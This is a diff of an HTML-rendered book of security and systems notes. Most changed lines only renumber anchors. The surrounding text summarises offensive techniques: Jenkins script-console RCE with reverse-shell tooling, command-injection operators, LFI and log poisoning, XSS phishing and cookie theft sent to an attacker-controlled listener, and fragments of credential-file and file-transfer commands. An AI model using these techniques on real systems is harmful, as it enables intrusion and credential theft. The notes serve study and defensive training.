+<p>Jenkins is frequently a high-privilege target, especially in CI/CD environments where it integrates with production systems and secrets management tools.</p>
+<hr>
+<h2 id="tools-summary-3"><a class="header" href="#tools-summary-3">Tools Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>Script Console</td><td>Native Groovy RCE interface</td></tr>
+<tr><td>msfvenom</td><td>Generate reverse shell payloads</td></tr>
+<tr><td>Metasploit <code>jenkins_rce</code></td><td>Automated exploitation</td></tr>
+<tr><td>nc/ncat</td><td>Reverse shell listener</td></tr>
+<tr><td>curl</td><td>Script console interaction (if API enabled)</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="key-takeaways-8"><a class="header" href="#key-takeaways-8">Key Takeaways</a></h2>
+<ul>
+<li><strong>Script Console is RCE:</strong> Any authenticated access = code execution</li>
+<li><strong>Default credentials common:</strong> Many deployments use defaults unchanged</li>
+<li><strong>Often root/SYSTEM:</strong> Jenkins runs with high privileges in production</li>
+<li><strong>Groovy is powerful:</strong> Can execute any command available to Jenkins user</li>
+<li><strong>Version matters:</strong> Many CVEs are version-specific; check for outdated installations</li>
+<li><strong>Secrets storage:</strong> Jenkins keeps encrypted credentials; extraction reveals other systems’ access</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="command-injection-1"><a class="header" href="#command-injection-1">Command Injection</a></h1>
+<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory map</a></h2>
 <ul>
 <li><a href="#intro-to-command-injections">Intro — what command injection is, OWASP #3, OS command injection, PHP/NodeJS examples</a></li>
 <li><a href="#detecting-and-injecting-commands">Detection — injection operators, injecting commands, bypassing front-end validation, AND/OR operators, cross-injection operator reference</a></li>
@@ -27473,7 +28066,7 @@ spring.datasource.password=SecureP@ssw0rd!
 <li><a href="#evasion-tools">Evasion tools — Bashfuscator (Linux), DOSfuscation (Windows)</a></li>
 <li><a href="#command-injection-prevention">Prevention — system command avoidance, input validation, sanitization, server configuration</a></li>
 </ul>
-<h2 id="summary-10"><a class="header" href="#summary-10">Summary</a></h2>
+<h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
 <p><strong>Command injection</strong> vulnerabilities arise when user-controlled input flows unsanitized into a function that executes OS commands, allowing attackers to run arbitrary commands on the back-end server. Ranked <strong>#3 in OWASP’s Top 10</strong>, command injection is among the most critical web vulnerabilities — a successful exploitation can lead to full network compromise. All major web languages expose system command primitives (<code>exec</code>/<code>system</code>/<code>shell_exec</code> in PHP; <code>child_process.exec</code> / <code>child_process.spawn</code> in Node); the same injection techniques apply across all of them, and to any thick client or binary that passes unsanitized input to shell commands.</p>
 <p><strong>Detection</strong> mirrors exploitation: append a command after a known-good value using an injection operator and observe whether output changes. The core <strong>injection operators</strong> cover <code>;</code> (both commands run), <code>\n</code> / <code>%0a</code> (both, newline-separated), <code>&amp;</code> (both, second shown first), <code>|</code> (both, only second shown), <code>&amp;&amp;</code> (both only if first succeeds), <code>||</code> (second only if first fails), and sub-shell forms <code>`</code> and <code>$()</code> (Linux-only). When a front-end format check blocks a payload but fires <strong>no network request</strong>, validation is client-side only — bypass by sending a raw request through Burp Suite or ZAP, URL-encoding the payload before sending.</p>
 <p><strong>Filter and WAF identification</strong> starts by reducing the payload to one character at a time. An “Invalid input” inline response indicates an app-layer filter (e.g., a PHP <code>strpos</code> blacklist); a separate error page with IP/request details indicates a WAF. Map every blocked operator before choosing a bypass strategy.</p>
@@ -27874,7 +28467,7 @@ var ip = DOMPurify.sanitize(ip);
 <p>Secure configuration complements secure coding — neither alone is sufficient. Pair both with ongoing penetration testing, since any single mistake in a large codebase can reintroduce a vulnerability.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="file-inclusion-1"><a class="header" href="#file-inclusion-1">File inclusion</a></h1>
-<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory map</a></h2>
+<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory map</a></h2>
 <ul>
 <li><a href="#intro-to-file-inclusions">Intro to file inclusions — LFI basics, templating, impact, examples (PHP, Node, Java, .NET), read vs execute</a></li>
 <li><a href="#local-file-inclusion-lfi--exploitation-basics">Local file inclusion (LFI) — exploitation basics, traversal, prefixes, extensions, second-order</a></li>
@@ -27885,7 +28478,7 @@ var ip = DOMPurify.sanitize(ip);
 <li><a href="#lfi-and-file-uploads">LFI and file uploads — polyglot images, discovering upload paths, PHP <code>zip://</code> / <code>phar://</code> chains, legacy phpinfo edge case</a></li>
 <li><a href="#log-poisoning-for-lfi--rce">Log poisoning (LFI → RCE) — PHP session files, Apache/Nginx access logs, <code>/proc</code> hints, SSH/FTP/mail logs, permissions and safety</a></li>
 </ul>
-<h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
+<h2 id="summary-12"><a class="header" href="#summary-12">Summary</a></h2>
 <p>File inclusion flaws happen when <strong>HTTP parameters or path segments choose a file</strong> to load or render, and that choice is <strong>not safely constrained</strong>. <strong>Local File Inclusion (LFI)</strong> lets attackers read (or sometimes execute) arbitrary server files—common around <strong>templating</strong> patterns such as <code>index.php?page=about</code> where the <code>page</code> fragment maps to an include path. Impacts include <strong>source disclosure</strong>, <strong>secret leakage</strong> (keys, credentials, configs), and under some primitives <strong>remote code execution</strong>. Examples span <strong>PHP</strong> (<code>include</code> / <code>require</code> / <code>file_get_contents</code> and friends), <strong>Node</strong> (<code>fs.readFile</code>, <code>path.join</code> breakout, <code>res.render</code> with interpolated paths), <strong>Java/JSP</strong> (<code>jsp:include</code>, <code>c:import</code>), and <strong>.NET</strong> (<code>Response.WriteFile</code>, <code>@Html.Partial</code>, SSI includes). A key review axis is <strong>read-only vs execute</strong> and <strong>local vs remote URL</strong> support: execution-capable includes (e.g. PHP <code>include</code>, some <code>c:import</code> / SSI cases) widen blast radius to <strong>RCE</strong>, while read-only sinks still enable <strong>credential and logic leakage</strong>. Defensive themes are <strong>allowlisting</strong>, <strong>canonical path checks</strong>, and <strong>never wiring raw request data into filesystem or template resolution</strong>.</p>
 <p>For <strong>exploitation mechanics</strong>, see <a href="#local-file-inclusion-lfi--exploitation-basics">local-file-inclusion.md</a>: swapping parameters for system files (e.g. <code>/etc/passwd</code>), <strong><code>../</code> path traversal</strong> when a directory is prepended, <strong><code>/</code>-led payloads</strong> when a <strong>filename prefix</strong> is concatenated, the effect of <strong>appended extensions</strong>, <strong>second-order</strong> LFI via stored fields (e.g. usernames used in download paths), and the lab distinction between <strong>reading PHP source</strong> vs <strong>executing</strong> it.</p>
 <p>For <strong>filter and normalizer bypasses</strong> (single-pass <code>../</code> stripping, URL/double encoding, regex-approved path prefixes, and legacy PHP tricks for forced extensions), see <a href="#local-file-inclusion-lfi--basic-bypasses">lfi-basic-bypasses.md</a>.</p>
@@ -28430,7 +29023,7 @@ sudo mount -t cifs //&lt;IP&gt;/sharename /mnt/smb -o username=user
 cp file.txt /mnt/smb/
 sudo umount /mnt/smb
 </code></pre>
-<h2 id="summary-12"><a class="header" href="#summary-12">Summary</a></h2>
+<h2 id="summary-13"><a class="header" href="#summary-13">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal/paste buffer size</li>
 <li><strong>HTTP/HTTPS</strong>: Most common, multiple tools (curl, wget, Python), often allowed outbound</li>
@@ -28565,7 +29158,7 @@ echo PUT &lt;file&gt; &gt;&gt; ftpcommand.txt
 echo bye &gt;&gt; ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 </code></pre>
-<h2 id="summary-13"><a class="header" href="#summary-13">Summary</a></h2>
+<h2 id="summary-14"><a class="header" href="#summary-14">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal length</li>
 <li><strong>PowerShell WebClient</strong>: HTTP/HTTPS, most common, supports fileless execution</li>
@@ -29257,7 +29850,7 @@ Thus using an <strong>ACK scan</strong> (-sA) might be a good idea because the f
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-authentication"><a class="header" href="#linux-authentication">Linux Authentication</a></h1>
-<h2 id="summary-14"><a class="header" href="#summary-14">Summary</a></h2>
+<h2 id="summary-15"><a class="header" href="#summary-15">Summary</a></h2>
 <p>Linux uses Pluggable Authentication Modules (PAM) for authentication. The key modules (<code>pam_unix.so</code>, <code>pam_unix2.so</code>) are located in <code>/usr/lib/x86_64-linux-gnu/security/</code> on Debian-based systems. PAM handles user information, authentication, sessions, and password changes.</p>
 <h3 id="key-files-1"><a class="header" href="#key-files-1">Key Files</a></h3>
 <div class="table-wrapper">
@@ -29383,7 +29976,7 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
 </div>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="pivoting-tunneling-and-port-forwarding-1"><a class="header" href="#pivoting-tunneling-and-port-forwarding-1">Pivoting, Tunneling, and Port Forwarding</a></h1>
-<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory Map</a></h2>
+<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
 <ul>
 <li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
 <li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
@@ -30042,13 +30635,13 @@ debug1: channel 1: connected to 0.0.0.0 port 8000
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="sql-1"><a class="header" href="#sql-1">SQL</a></h1>
-<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
+<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
 <ul>
 <li><a href="#attacking-sql-databases">Attacking SQL Databases</a></li>
 <li><a href="#intro-to-sql-injections">Intro to SQL Injections</a></li>
 <li><a href="#subverting-query-logic">Subverting Query Logic</a></li>
 </ul>
-<h2 id="summary-15"><a class="header" href="#summary-15">Summary</a></h2>
+<h2 id="summary-16"><a class="header" href="#summary-16">Summary</a></h2>
 <p>Notes on attacking MySQL and MSSQL databases. Covers enumeration, authentication modes, connecting to databases, command execution (xp_cmdshell, webshells), privilege escalation via user impersonation, lateral movement through linked servers, and hash stealing techniques. Also covers SQL injection fundamentals including how unsanitized user input leads to injection, syntax error handling, the taxonomy of injection types (in-band, blind, and out-of-band), and subverting query logic with OR injection for authentication bypass.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-sql-databases"><a class="header" href="#attacking-sql-databases">Attacking SQL Databases</a></h1>
@@ -30379,7 +30972,7 @@ $result = $conn-&gt;query($query);
 <h1 id="openvas"><a href="#openvas" class="header">Openvas</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="web-attacks-1"><a class="header" href="#web-attacks-1">Web Attacks</a></h1>
-<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory map</a></h2>
+<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory map</a></h2>
 <ul>
 <li><a href="#introduction-to-web-attacks">Introduction — web attack context, HTTP Verb Tampering, IDOR, XXE overview</a></li>
 <li><a href="#http-verb-tampering">HTTP Verb Tampering — HTTP methods, insecure server config, insecure coding, auth bypass</a></li>
@@ -30395,7 +30988,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#xxe--blind-data-exfiltration">XXE blind data exfiltration — OOB via HTTP, PHP listener, DNS OOB, XXEinjector</a></li>
 <li><a href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References — MD5/Base64 schemes, function disclosure, reproducing hashes, mass enumeration script</a></li>
 </ul>
-<h2 id="summary-16"><a class="header" href="#summary-16">Summary</a></h2>
+<h2 id="summary-17"><a class="header" href="#summary-17">Summary</a></h2>
 <p>Web attacks are the most common class of attacks against businesses, targeting external-facing applications, internal web apps, and API endpoints alike. This section covers three attack types found across many web applications. <strong>HTTP Verb Tampering</strong> exploits servers that accept unexpected HTTP methods, allowing attackers to bypass authorization mechanisms and security controls by sending requests with non-standard verbs. <strong>Insecure Direct Object References (IDOR)</strong> exploit weak or missing back-end access controls: when applications use predictable identifiers (sequential IDs, user numbers) to reference resources, an attacker can guess or calculate valid IDs to access other users’ data. <strong>XML External Entity (XXE) Injection</strong> targets applications using outdated XML parsers to process user-supplied XML — malicious payloads can read local files (configs, source code, credentials), enable whitebox testing, steal server credentials, and potentially achieve remote code execution.</p>
 <p>HTTP Verb Tampering vulnerabilities stem from two sources. <strong>Insecure server configuration</strong> occurs when authentication rules are scoped to specific methods (e.g., <code>&lt;Limit GET POST&gt;</code>) leaving any other verb — such as <code>HEAD</code> — unauthenticated and freely accessible. <strong>Insecure coding</strong> occurs when input sanitization is applied to one HTTP method (e.g., <code>$_GET</code>) while the query uses a broader parameter source (e.g., <code>$_REQUEST</code>), allowing an attacker to switch to POST to bypass the filter entirely. The coding variant is more prevalent because it arises from common developer mistakes rather than misconfiguration.</p>
 <p><strong>Bypassing security filters</strong> is the more common variant: if a filter only inspects one method’s parameter source (e.g., <code>$_POST</code>), switching to a different method (e.g., GET) carries the payload through an unchecked channel while the underlying function (using <code>$_REQUEST</code>) still processes it. To confirm exploitation, use a two-file command injection payload (<code>file1; touch file2;</code>) — both files appearing proves command execution. A web app that appears fully filtered against injection may be completely exposed once the method is switched.</p>
@@ -30659,7 +31252,7 @@ done
 contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
 ...
 </code></pre>
-<h2 id="key-takeaways-8"><a class="header" href="#key-takeaways-8">Key takeaways</a></h2>
+<h2 id="key-takeaways-9"><a class="header" href="#key-takeaways-9">Key takeaways</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -32746,7 +33339,7 @@ https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
 https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="xss-cross-site-scripting-1"><a class="header" href="#xss-cross-site-scripting-1">XSS (Cross-Site Scripting)</a></h1>
-<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory map</a></h2>
+<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory map</a></h2>
 <ul>
 <li><a href="#cross-site-scripting-xss--introduction">Introduction — what XSS is, risk, examples, types</a></li>
 <li><a href="#stored-persistent-xss">Stored (persistent) XSS — impact, testing, persistence checks</a></li>
@@ -32758,7 +33351,7 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <li><a href="#xss-blind-detection--session-hijacking-cookie-stealing">XSS session hijacking — blind XSS, remote script OOB, cookie exfil, Firefox storage</a></li>
 <li><a href="#xss-prevention">XSS prevention — sources/sinks, validation, encoding, CSP, cookies</a></li>
 </ul>
-<h2 id="summary-17"><a class="header" href="#summary-17">Summary</a></h2>
+<h2 id="summary-18"><a class="header" href="#summary-18">Summary</a></h2>
 <p>Cross-site scripting lets attackers run JavaScript in victims’ browsers when applications fail to sanitize or encode user-controlled data. Notes cover client-side execution, typical impacts (session theft, forced actions, abuse of browser APIs), limits of pure XSS versus chaining with browser bugs, notable incidents (Samy worm, TweetDeck), and the three main types: <strong>stored</strong>, <strong>reflected</strong>, and <strong>DOM-based</strong> XSS. <strong>Stored</strong> XSS is covered in depth: saved payloads, wide victim pool, remediation in the database, basic PoC payloads (<code>alert(window.origin)</code>, <code>&lt;plaintext&gt;</code>, <code>print()</code>), iframe/origin confirmation, and using refresh to verify persistence. <strong>Reflected</strong> XSS is summarized separately: non-persistent behavior (vs DOM-based), error-message reflection, empty-quotes UI vs view-source confirmation, and delivering GET-based attacks via malicious URLs. <strong>DOM-based</strong> XSS is summarized separately: client-only processing, hash/URL sources, view-source vs inspector, source and sink functions, why <code>innerHTML</code> often blocks <code>&lt;script&gt;</code>, and event-handler payloads (e.g. <code>img</code> / <code>onerror</code>) delivered via shared URLs. <strong>XSS phishing</strong> is summarized separately: <strong>trusted-domain</strong> fake login UI that posts credentials to the attacker; <strong>authorized</strong> use as <strong>awareness simulations</strong>; <strong><code>/phishing</code>-style image URL</strong> labs where a raw <strong><code>&lt;script&gt;</code></strong> test often fails until <strong>source/context</strong> review; <strong><code>document.write</code></strong> for minified form HTML; <strong><code>getElementById('urlform').remove()</code></strong> after inspector (<strong><code>Ctrl+Shift+C</code></strong>) to drop the real URL field; <strong><code>&lt;!--</code></strong> after the payload to comment out trailing template; <strong>reflected</strong> delivery via a copied <strong>malicious URL</strong>; <strong>netcat</strong> on port <strong>80</strong> for quick <strong>GET</strong> <code>/?username=…&amp;password=…</code> capture vs a <strong>PHP</strong> listener that <strong>logs</strong> to <strong><code>creds.txt</code></strong> and <strong>redirects</strong> to the clean app so the victim does not see a broken HTTP response. <strong>XSS discovery</strong> is summarized separately: <strong>automated</strong> scanning (passive DOM hints vs active payload injection; commercial vs OSS tradeoffs), tools such as <strong>XSStrike</strong> / <strong>Brute XSS</strong> / <strong>XSSer</strong> and why <strong>reflection in HTML ≠ execution</strong>, <strong>manual</strong> testing with public payload lists and non-form sinks (<strong>headers</strong> like <strong>Cookie</strong> / <strong>User-Agent</strong>), why generic lists miss simple labs, optional custom scripting for odd targets, and <strong>manual code review</strong> as the most reliable path when full data flow is visible (with deeper secure-coding / white-box study left to other modules). <strong>XSS defacing</strong> is summarized separately: using <strong>stored</strong> XSS for <strong>persistent</strong> visual takeover, <strong>reputation</strong> impact (e.g. public sector defacements), four common levers (<strong><code>document.body.style.background</code></strong>, <strong><code>document.body.background</code></strong>, <strong><code>document.title</code></strong>, <strong><code>innerHTML</code></strong>), swapping <strong>full <code>&lt;body&gt;</code></strong> markup (with <strong><code>getElementsByTagName('body')[0]</code></strong>), optional <strong>jQuery</strong> when present, <strong>minified</strong> one-line HTML inside payloads, and how <strong>view-source</strong> can still show original structure while the <strong>rendered DOM</strong> looks defaced—plus <strong>injection position</strong> (end vs middle of page) affecting what later content might still appear. <strong>XSS session hijacking / blind XSS</strong> is summarized separately: <strong>cookies</strong> as session handles; <strong>blind</strong> sinks (<strong>admin</strong> panels, tickets, reviews, <strong><code>User-Agent</code></strong>); <strong><code>/hijacking</code></strong>-style registration reviewed by staff; <strong>OOB</strong> detection via <strong><code>&lt;script src=http://IP/fieldname&gt;</code></strong> so the <strong>request path</strong> names the vulnerable input; <strong>PayloadsAllTheThings</strong>-style <strong>quote-break</strong> variants and <strong>XHR</strong> / <strong><code>$.getScript</code></strong> when jQuery exists; <strong><code>sudo php -S 0.0.0.0:80</code></strong> to catch callbacks; pragmatic <strong>skips</strong> (<strong>email</strong> validation, <strong>password</strong> unlikely echoed); then <strong><code>new Image().src</code></strong> (vs <strong><code>document.location</code></strong>) to send <strong><code>document.cookie</code></strong> in a <strong>GET</strong> to <strong><code>index.php?c=</code></strong>, <strong>PHP</strong> splitting on <strong><code>;</code></strong>, <strong><code>urldecode</code></strong>, <strong><code>cookies.txt</code></strong> lines with <strong><code>REMOTE_ADDR</code></strong>; replay in <strong>Firefox Storage</strong> (<strong><code>Shift+F9</code></strong>) by adding <strong>name/value</strong> and refreshing—plus <strong><code>HttpOnly</code></strong> as the main cookie theft mitigation. <strong>XSS prevention</strong> is summarized separately: secure <strong>sources</strong> and <strong>sinks</strong> on <strong>client and server</strong>; front-end <strong>regex validation</strong> (e.g. email), <strong>DOMPurify</strong> for client-side HTML sanitization, avoiding <strong><code>&lt;script&gt;</code> / <code>&lt;style&gt;</code> / attributes / comments</strong> built from input and dangerous APIs (<strong><code>innerHTML</code></strong>, <strong><code>document.write</code></strong>, <strong><code>document.domain</code></strong>, jQuery <strong><code>.html()</code></strong> / <strong><code>parseHTML()</code></strong> / insertion helpers); back-end <strong><code>filter_var</code></strong> / validation, sanitization libraries, <strong>never raw echo</strong> of request params; <strong>output encoding</strong> with <strong><code>htmlspecialchars</code>/<code>htmlentities</code></strong> (PHP) or <strong><code>html-entities</code></strong> (Node); deployment levers (<strong>HTTPS</strong>, <strong>CSP</strong> like <strong><code>script-src 'self'</code></strong>, <strong><code>X-Content-Type-Options: nosniff</code></strong>, <strong><code>HttpOnly</code>/<code>Secure</code></strong> cookies, <strong>WAF</strong>, framework defaults such as <strong>ASP.NET</strong>); and ongoing <strong>offensive retesting</strong> because secure coding plus config can still miss edge cases—the note clarifies that <strong><code>addslashes</code></strong> alone is a weak primary HTML-XSS control versus <strong>contextual encoding</strong>.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="dom-based-xss"><a class="header" href="#dom-based-xss">DOM-Based XSS</a></h1>
@@ -33275,7 +33868,7 @@ if (isset($_GET['c'])) {
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
-<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
+<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
 <ul>
 <li><a href="kubernetes/cks">cks</a></li>
 <li><a href="kubernetes/kcna">kcna</a></li>
@@ -33283,7 +33876,7 @@ if (isset($_GET['c'])) {
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cks"><a class="header" href="#cks">CKS</a></h1>
-<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
+<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
 <ul>
 <li><a href="#certified-kubernetes-security-specialist-cks-notes">notes</a></li>
 <li><a href="#kubernetes-security-specialist-cks-practice-scenarios">questions</a></li>
@@ -36398,7 +36991,7 @@ EOF
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcna"><a class="header" href="#kcna">KCNA</a></h1>
-<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
+<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-native-associate-kcna-notes">notes</a></li>
 </ul>
@@ -36932,7 +37525,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcsa"><a class="header" href="#kcsa">KCSA</a></h1>
-<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
+<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-security-associate-kcsa-notes">notes</a></li>
 </ul>
@@ -37299,7 +37892,7 @@ spec:
 <li>Threat modeling helps you identify potential threats, understand their impact, and put measures in place to prevent them</li>
 <li>Understand how traffic/data flows in the environment and identity vulnerabilities at each point</li>
 </ul>
-<h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
+<h2 id="persistence-1"><a class="header" href="#persistence-1">Persistence</a></h2>
 <ul>
 <li>Once an attacker accesses the environment, the first goal is typically to establishpersistence.</li>
 <li>Persistence allows attackers to maintain access to a cluster</li>
@@ -37533,7 +38126,7 @@ spec:
 </h4>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
-<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
+<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
 <ul>
 <li><a href="networking/browser-networking">browser-networking</a></li>
 <li><a href="networking/http">http</a></li>
@@ -37563,7 +38156,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="browser-networking"><a class="header" href="#browser-networking">Browser Networking</a></h1>
-<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
+<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
 <ul>
 <li><a href="#chapter-1">chapter01</a></li>
 <li><a href="#chapter-2">chapter02</a></li>
@@ -37836,7 +38429,7 @@ Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                           
 <p>WebSockets can transfer test or binary data.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-1"><a class="header" href="#http-1">HTTP</a></h1>
-<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
+<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
 <ul>
 <li><a href="#clean-urls">clean_urls</a></li>
 <li><a href="#http-persistent-connection">persistent_connections</a></li>
@@ -38085,7 +38678,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="load-balancing"><a class="header" href="#load-balancing">Load Balancing</a></h1>
-<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
+<h2 id="directory-map-34"><a class="header" href="#directory-map-34">Directory Map</a></h2>
 <ul>
 <li><a href="#load-balancing-1">load-balancing</a></li>
 </ul>
@@ -38120,7 +38713,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="nginx"><a class="header" href="#nginx">Nginx</a></h1>
-<h2 id="directory-map-34"><a class="header" href="#directory-map-34">Directory Map</a></h2>
+<h2 id="directory-map-35"><a class="header" href="#directory-map-35">Directory Map</a></h2>
 <ul>
 <li><a href="#custom-header-response">custom-header-response</a></li>
 </ul>
@@ -38134,7 +38727,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="protocols-1"><a class="header" href="#protocols-1">Protocols</a></h1>
-<h2 id="directory-map-35"><a class="header" href="#directory-map-35">Directory Map</a></h2>
+<h2 id="directory-map-36"><a class="header" href="#directory-map-36">Directory Map</a></h2>
 <ul>
 <li><a href="#dns-3">dns</a></li>
 <li><a href="#ftp-2">ftp</a></li>
@@ -38760,7 +39353,7 @@ msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 </code></pre>
-<h2 id="default-credentials"><a class="header" href="#default-credentials">Default Credentials</a></h2>
+<h2 id="default-credentials-1"><a class="header" href="#default-credentials-1">Default Credentials</a></h2>
 <p>During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:</p>
 <div class="table-wrapper">
 <table>
@@ -39199,7 +39792,7 @@ iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64"
 <h1 id="websockets"><a class="header" href="#websockets">WebSockets</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="rate-limiting-algorithms"><a class="header" href="#rate-limiting-algorithms">Rate Limiting Algorithms</a></h1>
-<h2 id="directory-map-36"><a class="header" href="#directory-map-36">Directory Map</a></h2>
+<h2 id="directory-map-37"><a class="header" href="#directory-map-37">Directory Map</a></h2>
 <ul>
 <li><a href="#fixed-window-counter-algorithm">fixed-window-counter</a></li>
 <li><a href="#leaking-bucket-algorithm">leaking-bucket</a></li>
@@ -39356,7 +39949,7 @@ func main() {
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="redis-1"><a class="header" href="#redis-1">Redis</a></h1>
-<h2 id="directory-map-37"><a class="header" href="#directory-map-37">Directory Map</a></h2>
+<h2 id="directory-map-38"><a class="header" href="#directory-map-38">Directory Map</a></h2>
 <ul>
 <li><a href="#redis-2">redis</a></li>
 </ul>
@@ -41337,7 +41930,7 @@ As stated above, most processes have the same EUID and RUID. As a result, the de
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="bash-1"><a class="header" href="#bash-1">Bash</a></h1>
-<h2 id="directory-map-38"><a class="header" href="#directory-map-38">Directory Map</a></h2>
+<h2 id="directory-map-39"><a class="header" href="#directory-map-39">Directory Map</a></h2>
 <ul>
 <li><a href="#bash-notes">bash_notes</a></li>
 <li><a href="#moving-the-cursor-1">keyboard_shortcuts</a></li>
@@ -41612,7 +42205,7 @@ similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="commands-4"><a class="header" href="#commands-4">Commands</a></h1>
-<h2 id="directory-map-39"><a class="header" href="#directory-map-39">Directory Map</a></h2>
+<h2 id="directory-map-40"><a class="header" href="#directory-map-40">Directory Map</a></h2>
 <ul>
 <li><a href="#chgrp">chgrp</a></li>
 <li><a href="#chmod">chmod</a></li>
@@ -41804,7 +42397,7 @@ PID        TTY     STAT   TIME          CMD
 <p>See page 37</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="greybeard-qualification-1"><a class="header" href="#greybeard-qualification-1">Greybeard Qualification</a></h1>
-<h2 id="directory-map-40"><a class="header" href="#directory-map-40">Directory Map</a></h2>
+<h2 id="directory-map-41"><a class="header" href="#directory-map-41">Directory Map</a></h2>
 <ul>
 <li><a href="#block-devices-and-file-systems">block_dev_and_file_systems</a></li>
 <li><a href="#memory-management-1">memory_management</a></li>
@@ -42950,7 +43543,7 @@ When the process calls exit():
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="tools-4"><a class="header" href="#tools-4">Tools</a></h1>
-<h2 id="directory-map-41"><a class="header" href="#directory-map-41">Directory Map</a></h2>
+<h2 id="directory-map-42"><a class="header" href="#directory-map-42">Directory Map</a></h2>
 <ul>
 <li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
 <li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
@@ -45046,7 +45639,7 @@ C:\Windows\system32&gt; whoami
 nt authority\system
 </code></pre>
 <hr>
